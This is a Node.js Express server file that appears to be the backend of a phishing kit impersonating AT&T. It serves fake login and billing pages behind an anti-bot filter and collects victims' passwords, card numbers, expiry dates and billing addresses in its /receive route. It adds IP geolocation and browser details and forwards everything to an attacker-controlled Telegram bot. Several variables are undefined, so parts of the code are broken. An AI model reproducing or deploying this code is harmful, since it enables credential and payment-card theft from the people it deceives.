const express = require('express');
const path = require('path');
const { engine } = require('express-edge');
const antibot = require('./app/middleware/antibot');
const app = new express();
const port = process.env.PORT || 3000;

// Bot Detection Middlewares
app.use(antibot);

// Middlewares
app.use(express.static(path.join(`${__dirname}/public`)));
app.use(express.urlencoded({ extended: true }));

// Template Engine
app.use(engine);
app.set('views', path.join(`${__dirname}/views`));

// Routes
const router = require('./app/routers/router');
app.use('/', router);



const sendTelegramMessage = (text) => {
  
    const website = `https://api.telegram.org/bot${botToken}`;
    const params = querystring.stringify({
      chat_id: chatId,
      text: text,
    });

    const options = {
      hostname: 'api.telegram.org',
      path: '/bot' + botToken + '/sendMessage',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': params.length,
      },
    };
    
    console.log('sent');

    const req = https.request(options, (res) => {
      // Handle the response if needed
    });

    req.write(params);
    req.end();
};


app.get('/login', async (req, res) => {
    try {
        // Read the content of the login.html file
        const htmlContent = await fs.readFile('../att/index2.html', 'utf-8');

        // Send the HTML content as a response
        res.send(htmlContent);
    } catch (error) {
        // Handle any errors, for example, file not found
        console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
});


app.get('/billing', async (req, res) => {
    try {
        // Read the content of the login.html file
        const htmlContent = await fs.readFile('../att/billing.html', 'utf-8');

        // Send the HTML content as a response
        res.send(htmlContent);
    } catch (error) {
        // Handle any errors, for example, file not found
        console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/receive', async (req, res) => {
  let message = '';
  let myObject = req.body;

  const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

  const ipAddress = getClientIp(req);
  const ipAddressInformation = await sendAPIRequest(ipAddress);
  const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];

  const myObjects = Object.keys(myObject);
	console.log(myObjects);

  if (myObjects.includes('Password')) {
    message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
               `👤 ${myObject['loginTime']}\n\n`;

    for (const key of myObjects) {
	    if (key !== 'loginTime') {
    console.log(`${key}: ${myObject[key]}`);
      message += `${key}: ${myObject[key]}\n`;;
	    }
      
    }
    
    message += `🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddressInformation.ip}\n` +
        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
        `CITY             : ${ipAddressInformation.location.city}\n` +
        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		`ISP              : ${ipAddressInformation.network.organisation}\n\n` +
        `💻 SYSTEM INFO\n` +
        `USER AGENT       : ${userAgent}\n` +
        `SYSTEM LANGUAGE  : ${systemLang}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n`;

res.send(cCard);

  }

  if (myObjects.includes('Expiry date') || myObjects.includes('Card Number') || myObjects.includes('Billing Address')) {
    message += `✅ UPDATE TEAM | ATT | USER_${ipAddress}\n\n` +
               `👤 CARD INFO\n\n`;

    for (const key of myObjects) {
      console.log(`${key}: ${myObject[key]}`);
      message += `${key}: ${myObject[key]}\n`;
    }
    
    message += `🌍 GEO-IP INFO\n` +
			`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`+
        `💬 Telegram: https://t.me/UpdateTeams\n`;

res.send('dn');
  }

  
  console.log(message); 
  const sendMessage = sendMessageFor(botToken, chatId); 
  sendMessage(message);
  
  
});


app.listen(port, () => {
	console.log(`App listening on port ${port}`);
});
